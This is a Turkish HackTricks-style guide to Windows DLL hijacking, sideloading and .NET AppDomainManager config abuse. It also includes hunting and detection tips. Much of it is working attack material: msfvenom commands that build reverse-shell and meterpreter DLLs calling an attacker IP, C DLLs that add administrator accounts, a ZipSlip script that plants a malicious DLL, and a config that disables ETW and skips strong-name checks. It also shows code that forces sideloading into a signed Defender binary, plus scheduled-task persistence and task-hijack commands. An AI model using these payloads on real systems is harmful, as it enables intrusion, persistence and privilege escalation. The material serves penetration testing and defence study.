# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Esas olarak code execution, persistence ve daha nadiren privilege escalation için kullanılır. Buradaki odak escalation olsa da hijacking yöntemi hedeflerden bağımsız olarak aynı kalır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır ve her yöntemin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı olanla değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi meşru DLL'den önce gelen bir arama yoluna yerleştirerek uygulamanın arama düzeninden yararlanmak.
3. **Phantom DLL Hijacking**: Var olmayan, gerekli bir DLL olduğunu düşünerek uygulamanın yükleyeceği kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir karşılığıyla değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi kopyalanan uygulamayla birlikte kullanıcı tarafından kontrol edilen bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** işleminin attacker code yüklemesini sağlamanın tek yolu değildir. Hedef executable bir **managed** uygulamaysa CLR, executable'ın adını taşıyan bir **application configuration file** dosyasına da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Config, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'yi gösteriyorsa CLR bunu **application'ın normal code path'inden önce** yükler ve trusted process içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework configuration schema'sına göre custom manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework specific** bir tradecraft yaklaşımıdır. Win32 DLL search order yerine CLR config parsing işlemine dayanır.
- Host gerçekten **managed EXE** olmalıdır. Hızlı triage için: `sigcheck -m target.exe`, `corflags target.exe` kullanın veya PE metadata içinde **CLR Runtime Header** olup olmadığını kontrol edin.
- Config filename, executable adıyla tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **signed Microsoft/vendor binaries** ile kullanışlıdır; trusted EXE'ye dokunulmadan malicious managed assembly in-process olarak çalıştırılır.
- Zaten writable bir installer/update directory erişiminiz varsa, AppDomainManager hijacking **first stage** olarak kullanılabilir; ardından sonraki aşamalar için classic DLL sideloading veya reflective loading uygulanabilir.

### Downloader + scheduled-task bootstrap olarak AppDomainManager

Pratik bir intrusion pattern, trusted managed EXE'yi hem malicious `*.config` hem de yalnızca **small bootstrapper** olarak çalışan malicious bir AppDomainManager DLL ile birlikte kullanmaktır:<sup>[[25]](#references)</sup>

1. User, signed bir .NET installer veya updater'ı `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan başlatır.
2. Yanındaki config, legitimate app logic başlamadan **önce** CLR'ın attacker assembly'yi yüklemesine neden olur.
3. Malicious manager bir **path gate** uygular (örneğin yalnızca host EXE `Downloads` içinden çalışıyorsa devam eder ve yalnızca second stage'in `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Check başarılı olursa payload'ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi user-writable bir path'e indirir ve scheduled task ile persistence kurar.

Bu varyant neden önemlidir:
- Signed host EXE değişmeden kalır; yalnızca main binary'yi hash'leyen triage işlemleri compromise durumunu gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL triad'ını Desktop, Temp veya sandbox path'ine taşımak chain'i kasıtlı olarak bozabilir.
- First-stage AppDomainManager DLL küçük ve düşük gürültülü kalabilir; gerçek implant daha sonra indirilir.

Bu pattern ile sık görülen minimal persistence örneği:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notlar:
- ` /rl highest`, bu kullanıcı/oturum için **kullanılabilir en yüksek** yetki düzeyi anlamına gelir; tek başına garantili bir SYSTEM yükseltmesi değildir.
- Bu teknik, klasik missing-DLL search-order hijacking olsa da operatörler genellikle ikisini birlikte zincirlediğinden, **.NET config abuse üzerinden execution/persistence** olarak sınıflandırılmaya daha uygundur.

Tespit odakları:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET yürütülebilir dosyaları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içine işaret eden ve adları browser/vendor updater'larını taklit eden yeni scheduled task'lar.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan kısa ömürlü managed bootstrap process'leri.
- Yürütülebilir dosyanın yolu beklenen bir kullanıcı profili diziniyle eşleşmediği sürece erken sonlanan örnekler.

### Mevcut bir scheduled task'ı sideload zincirini yeniden başlatacak şekilde hijack etme

Persistence için yalnızca **yeni bir task oluşturulmasını** aramayın. Bazı intrusion set'leri, meşru bir installer'ın **normal bir updater task'ı oluşturmasını** bekler ve ardından mevcut task action'ını yeniden yazar; böylece mevcut ad, author ve trigger savunmacılara tanıdık kalır.

Tekrar kullanılabilir workflow:
1. Meşru software'i kurun/çalıştırın ve normalde oluşturduğu task'ı belirleyin.
2. Task XML'ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca action'ı değiştirerek task'ın, user-writable bir staging directory içindeki **trusted host EXE**'yi başlatmasını sağlayın; bu EXE daha sonra gerçek payload'ı side-load eder veya AppDomain-loads.
4. Yeni ve bariz bir persistence artifact'ı oluşturmak yerine aynı task adını yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha stealth:
- Task adı hâlâ meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** başlattığı için parent/ancestor validation çoğu zaman `explorer.exe` yerine beklenen scheduling chain'i görür.
- Yalnızca **yeni task adlarını** arayan DFIR ekipleri, registration'ı zaten mevcut olan ancak action'ı artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın kontrolündeki başka bir path'i gösteren bir task'ı kaçırabilir.

Hızlı hunting pivot'ları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML'ini ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata'sını bir baseline ile karşılaştırın.
- **vendor-looking updater task** **user-writable directories** içinden çalıştığında veya yanına konumlandırılmış `*.config` dosyasına sahip bir .NET EXE başlattığında alert oluşturun.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants'ı DLL sideloading üzerine ekleyen adım adım bir chain için aşağıdaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri Bulma

Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter'ı ayarlamaktır**:

![Common Techniques - Eksik DLL'leri Bulma: Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri Bulma: Bir system içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırmak ve aşağıdaki 2 filter'ı ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![Common Techniques - Eksik DLL'leri Bulma: ve yalnızca File System Activity'yi gösterin](<../../../images/image (153).png>)

Genel olarak **eksik DLL'leri** arıyorsanız bunu birkaç **saniye** çalışır durumda **bırakın**.\
Belirli bir executable içinde **eksik bir DLL** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filter ayarlayın, executable'ı çalıştırın ve event capture'ını durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'lerden Yararlanma

Privilege escalation gerçekleştirmek için **privileged bir process'in** yazabildiğiniz bir location'dan yüklemeye çalıştığı bir **DLL** arayın. Bu durum, legitimate DLL'yi içeren directory'den önce aranan bir directory'yi kontrol ettiğinizde veya istenen DLL mevcut olmadığında ve aranan directory'lerden birine yazabildiğinizde meydana gelebilir.

### DLL Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde DLL'lerin tam olarak nasıl yüklendiğini bulabilirsiniz.**

**Windows applications**, **pre-defined search paths** kümesini belirli bir sıraya uyarak kullanarak DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin bu directory'lerden birine stratejik olarak yerleştirilmesi ve authentic DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemek için bir çözüm, application'ın ihtiyaç duyduğu DLL'lere başvururken absolute path kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemlerdeki **DLL search order**'ı görebilirsiniz:

1. Application'ın yüklendiği directory.
2. System directory. Bu directory'nin path'ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function'ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory'nin path'ini alan bir function yoktur, ancak bu directory aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory'nin path'ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function'ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directory'ler. Bunun **App Paths** registry key'i tarafından belirtilen per-application path'i içermediğine dikkat edin. DLL search path hesaplanırken **App Paths** key'i kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **default** search order'dır. Devre dışı bırakıldığında current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value'sunu oluşturun ve 0 olarak ayarlayın (default etkin durumdadır).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function'ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa search, **LoadLibraryEx**'in yüklediği executable module'ün directory'sinde başlar.

Son olarak bir DLL, adı yerine absolute path kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisi için yalnızca bu path'e bakar; ancak name ile istenen dependencies yine geçerli search order'ı izler.

Search order'ı değiştirmenin başka yolları da vardır, ancak bunları burada açıklamayacağım.

### Arbitrary file write'ı missing-DLL hijack'e zincirleme

**Related technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Process'in probe ettiği ancak bulamadığı DLL adlarını toplamak için **ProcMon** filter'larını (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu adlardan birine sahip bir DLL'yi **application directory**'sine (search-order entry #1) bırakmak, bir sonraki execution'da yüklenmesini sağlar. Bir .NET scanner örneğinde process, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` içinden yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export içeren bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip-style arbitrary write** ise, entry'si extraction dir dışına çıkacak ve DLL'nin app folder'a düşmesini sağlayacak bir ZIP oluşturun:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen inbox/share konumuna teslim edin; scheduled task işlemi yeniden başlattığında malicious DLL yüklenir ve kodunuz service account olarak çalıştırılır.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlama

Yeni oluşturulan bir process'in DLL search path'ini deterministik olarak etkilemenin gelişmiş bir yolu, process oluşturulurken ntdll'nin native API'lerini kullanarak RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir directory sağlayarak, import edilen bir DLL'yi adına göre çözen (absolute path kullanmayan ve safe loading flags kullanmayan) bir target process'in malicious DLL'yi bu directory'den yüklemesi zorlanabilir.

Key idea
- RtlCreateProcessParametersEx ile process parameters oluşturun ve controlled folder'ınızı gösteren özel bir DllPath sağlayın (örneğin dropper/unpacker'ınızın bulunduğu directory).
- RtlCreateUserProcess ile process'i oluşturun. Target binary bir DLL'yi adına göre çözdüğünde loader, resolution sırasında sağlanan DllPath'e başvurur; böylece malicious DLL target EXE ile aynı konumda olmasa bile güvenilir sideloading sağlanır.

Notes/limitations
- Bu, oluşturulan child process'i etkiler; yalnızca current process'i etkileyen SetDllDirectory'den farklıdır.
- Target, bir DLL'yi adına göre import etmeli veya LoadLibrary kullanmalıdır (absolute path kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading'i zorlama</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı bir xmllite.dll dosyasını (gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy oluşturan) DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen imzalı bir binary başlatın. Loader, import işlemini sağlanan DllPath üzerinden çözer ve DLL'nizi sideload eder.

Bu tekniğin, gerçek dünyada çok aşamalı sideloading zincirlerini çalıştırmak için kullanıldığı gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır; bu DLL daha sonra özel bir DllPath ile Microsoft tarafından imzalanmış ve hijack edilebilir bir binary'yi başlatarak saldırgana ait DLL'nin staging dizininden yüklenmesini zorlar.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** hedefleri için sideloading, uygulamanın yanındaki **`.exe.config`** dosyasının kötüye kullanılmasıyla bellek patch'lemeden **`Main()` öncesinde** gerçekleştirilebilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyasının ve saldırganın kontrolündeki bir veya daha fazla assembly'nin yanına yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE başlar ve **CLR `<exe>.config` dosyasını okur**.
2. Config, runtime'ın saldırganın kontrolündeki bir `AppDomainManager` örneğini oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesi execution** elde eder.
4. Aynı config, CLR'ın yerel assembly'leri önce çözümlemesini (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) zorlayabilir ve inline patching yapmadan runtime validation/telemetry mekanizmalarını zayıflatabilir.

Campaign tarzı pattern (tam iç içe yapı directive / CLR version'a göre değişebilir):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Neden kullanışlıdır:
- **`<probing privatePath="."/>`**, assembly resolution işlemini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, yürütmeyi CLR initialization sırasında, meşru uygulama mantığı çalışmadan önce attacker code içine taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name validation failure oluşmadan unsigned veya değiştirilmiş assembly'leri yüklemesine izin verebilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmeleriyle daha yeni assembly'lere geçilmesini önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha deterministik hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle dikkat çekicidir; çünkü **CLR, implantın bellekte `EtwEventWrite` patch'lemesi yerine kendi ETW görünürlüğünü configuration üzerinden devre dışı bırakır**.

Son kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı bir **AppData update** klasörüne kopyalar, host'u `update.exe` gibi bir adla yeniden adlandırır ve bir **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, final RAT DLL/export'u yüklemeden önce execution context'i doğrular; örneğin Task Scheduler'dan beklenen parent'ın `svchost.exe` olması.

Hunting fikirleri:
- Kullanıcı tarafından yazılabilir konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET executable**'ları.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- **`%LOCALAPPDATA%`** ya da uygulamaya özgü `\bin\update\` dizinlerinden yeniden adlandırılmış update binary'lerini başlatan scheduled task'ler.
- Bir scheduled task'in trusted .NET host'u başlattığı ve host'un hemen kendi dizinindeki vendor dışı assembly'leri yüklediği parent/child zincirleri.

#### Windows docs kaynaklı DLL search order istisnaları

Windows documentation'da standard DLL search order için belirli istisnalara yer verilir:

- **Bellekte zaten yüklü olan bir DLL ile aynı ada sahip bir DLL** bulunduğunda sistem olağan search işlemini atlar. Bunun yerine, bellekteki DLL'ye geçmeden önce redirection ve manifest kontrolü yapar. **Bu senaryoda sistem DLL için search gerçekleştirmez**.
- DLL, mevcut Windows version için bir **known DLL** olarak tanınıyorsa sistem, search process'i **atlayarak**, known DLL'nin kendi version'ını ve buna bağlı DLL'leri kullanır. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**, bu known DLL'lerin listesini tutar.
- Bir **DLL'nin dependencies'leri** varsa bu dependent DLL'ler, ilk DLL full path kullanılarak tanımlanmış olsa bile yalnızca **module names** ile belirtilmiş gibi aranır.

### Privileges Escalating

**Requirements**:

- **DLL** eksik olan ve **different privileges** altında çalışan veya çalışacak bir process belirleyin (horizontal veya lateral movement).
- **DLL**'nin aranacağı herhangi bir **directory** için **write access** olduğundan emin olun. Bu konum executable'ın directory'si veya system path içindeki bir directory olabilir.

Bu ön koşullar varsayılan olarak yaygın değildir: privileged executable'lar genellikle eksik DLL dependencies'lerine sahip olmaz ve standard user'lar normalde system search-path directory'lerine yazamaz. Yanlış yapılandırılmış environment'lar yine de her iki koşulu da ortaya çıkarabilir.\
Requirements karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) project'ine bakın. Ana amacı UAC bypass olsa da belirli Windows version'ları için DLL-hijacking PoC'leri içerir ve bunlar çoğu zaman bulduğunuz writable directory'ye uyarlanabilir.

Bir folder'daki **permissions** durumunuzu şu şekilde **check edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable'ın import'larını ve bir DLL'nin export'larını şu araçlarla da kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a **System Path klasöründe** yazma izinleriyle **DLL Hijacking kullanarak ayrıcalıkları yükseltmenin** kapsamlı rehberi için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sistem PATH'i içindeki herhangi bir klasörde yazma izinleriniz olup olmadığını kontrol eder.\
Bu açığı keşfetmek için kullanılabilecek diğer ilginç otomatik araçlar **PowerSploit functions**'lardır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

İstismar edilebilir bir senaryo bulmanız durumunda, bunu başarıyla istismar etmek için en önemli hususlardan biri, **çalıştırılabilir dosyanın içe aktaracağı tüm functions'ları dışa aktaran en az bir dll oluşturmaktır**. Her durumda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlatarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity seviyesinden SYSTEM'e**](../index.html#from-high-integrity-to-system)** yükselmek** için kullanışlı olduğunu unutmayın. **Geçerli bir dll oluşturma** örneğini, execution için DLL hijacking'e odaklanan bu DLL hijacking incelemesinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölüm**de **template** olarak kullanılabilecek veya **gerekli olmayan functions'ları dışa aktaran bir dll** oluşturmak için yararlı olabilecek bazı **temel dll kodlarını** bulabilirsiniz.

## **DLLs oluşturma ve derleme**

### **DLL Proxifying**

Temel olarak bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, ancak aynı zamanda **tüm çağrıları gerçek kütüphaneye ileterek** gerçek kütüphane tarafından **beklendiği şekilde** **açığa çıkarabilen** ve **çalışabilen** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir **çalıştırılabilir dosya belirleyip proxify etmek istediğiniz kütüphaneyi seçebilir** ve **proxified dll oluşturabilir** ya da **DLL'yi belirleyip** **proxified dll oluşturabilirsiniz**.

### **Meterpreter**

**rev shell al (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) elde edin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi DLL'iniz

Birçok durumda derlediğiniz DLL'nin, **victim process tarafından import edilen her function'ı export etmesi** gerekir. Gerekli bir export eksikse binary bunu resolve edemez ve exploit başarısız olur.

<details>
<summary>C DLL şablonu (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread entry içeren alternatif C DLL'i</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

